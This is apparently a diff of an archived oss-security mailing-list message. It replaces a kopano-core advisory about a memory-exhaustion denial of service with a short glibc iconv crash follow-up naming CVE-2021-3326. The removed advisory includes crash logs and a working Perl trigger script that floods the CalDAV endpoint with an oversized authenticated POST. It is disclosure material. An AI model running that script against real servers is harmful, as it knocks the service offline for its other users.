@@ -1,74 +1,22 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/08/14/2
-Message-ID: <667r8r55-1p9r-9n56-p26s-31q32674814@inai.de>
-Date: Fri, 13 Aug 2021 14:21:03 +0200 (CEST)
-From: Jan Engelhardt <jengelh@...i.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/01/28/2
+Message-ID: <CAAHN_R0By+J-YoqZ-8amdM9SrZ8_EnHdTgiVtufPPZF-ZwEgPw@mail.gmail.com>
+Date: Thu, 28 Jan 2021 08:24:10 +0530
+From: Siddhesh Poyarekar <siddhesh.poyarekar@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception
+Subject: Re: glibc iconv crash with ISO-2022-JP-3
 Content-Type: text/plain; charset=utf-8
 
+On Wed, 27 Jan 2021 at 21:08, Siddhesh Poyarekar
+<siddhesh.poyarekar@...il.com> wrote:
+>
+> On Wed, 27 Jan 2021 at 21:03, Tavis Ormandy <taviso@...il.com> wrote:
+> > The impact is just that you can't open your mail client, because it
+> > crashes as soon as it sees the subject.
+> >
+> > Upstream bug: https://sourceware.org/bugzilla/show_bug.cgi?id=27256
+> > Patch: https://sourceware.org/pipermail/libc-alpha/2021-January/122058.html
+>
+> FYI, I have filed a CVE request for this with Mitre.
 
-To the best of my knowledge, this is the initial publication,
-and there is no CVE number as of this time.
-
-
-== Affected versions ==
-
-  * kopano-core 11.0.2.43 and presumably all prior versions
-
-
-== Issue ==
-
-The ical parser in kopano-ical's "iCal::HrHandleIcalPost" function is
-very memory hungry. With the testcase below, I observe that the
-function makes the process image grow to as much memory as 30x the
-size of the HTTP request it is processing. A suitably-chosen input
-can be used to push the process over the limits of the environment.
-An authenticated user is required to perform the operation, however.
-
-If those conditions are met, std::bad_alloc can escape and, since this 
-exception is unhandled, terminates the program, depriving other users of 
-the service.
-
-# ulimit -v 4000000
-# ./kopano-ical -F &
-01:04:40.029434: kopano-ical 11.0.1
-01:04:40.029481: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
-01:04:40.029488: Thread name: kopano-ical
-01:04:40.029510: Peak RSS: 3911832
-01:04:40.029528: Pid 14984 caught SIGSEGV (11), traceback:
-01:04:40.029535: Backtrace:
-terminate called after throwing an instance of 'std::bad_alloc'
-  what():  std::bad_alloc
-01:04:40.030456: ----------------------------------------------------------------------
-01:04:40.030464: Fatal error detected. Please report all following information.
-01:04:40.030471: kopano-ical 11.0.1
-01:04:40.030477: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
-01:04:40.030482: Thread name: kopano-ical
-01:04:40.030489: Peak RSS: 3911832
-01:04:40.030494: Pid 14984 caught SIGABRT (6), out of memory or unhandled exception, traceback:
-01:04:40.030499: Backtrace:
-terminate called recursively
-Aborted (core dumped)
-
-
-== Trigger ==
-
-#!/usr/bin/perl
-use IO::Socket::INET;
-$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,8000);
-$rep = $ARGV[0] || 500; # max 19522
-$size = $rep *11*10000+28;
-$s->write("POST /caldav/ HTTP/1.0\nAuthorization: Basic Zm9vOmZvbw==\nContent-Length: $size\n\n");
-$s->write("BEGIN:VCALENDER\nVERSION:2.0\n");
-$a = "SUMMARY: A\n" x 10000;
-$s->write($a) for 1..$rep;
-
-
-== Mitigation ==
-
-An administrator could install an additional proxy/loadbalancer/etc.
-and there set a limit on the HTTP request size. (kopano-ical has
-nothing of its own.) However, such administrative action equally
-implies a reduction of the service's capabilities offered to
-end-users.
+This is now CVE-2021-3326.
